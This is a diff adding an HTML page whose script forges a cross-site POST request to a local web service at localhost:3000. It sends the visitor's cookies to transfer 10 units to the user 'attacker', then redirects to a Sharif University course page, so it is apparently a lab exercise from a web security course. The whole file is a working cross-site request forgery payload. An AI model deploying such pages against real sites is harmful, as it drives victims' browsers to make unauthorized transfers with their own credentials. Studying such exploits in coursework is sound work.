@@ -1,0 +1,15 @@
+<html>
+    <script>
+        fetch('http://localhost:3000/post_transfer', {
+            method: 'POST',
+            body: 'destination_username=attacker&quantity=10',
+            mode: 'no-cors',
+            credentials: 'include',
+            headers: {
+                "content-type": "application/x-www-form-urlencoded",
+            },
+        }).then(() => {
+            window.location.replace('http://sharif.edu/~kharrazi/courses/40441-011/')
+        })
+    </script>
+</html>
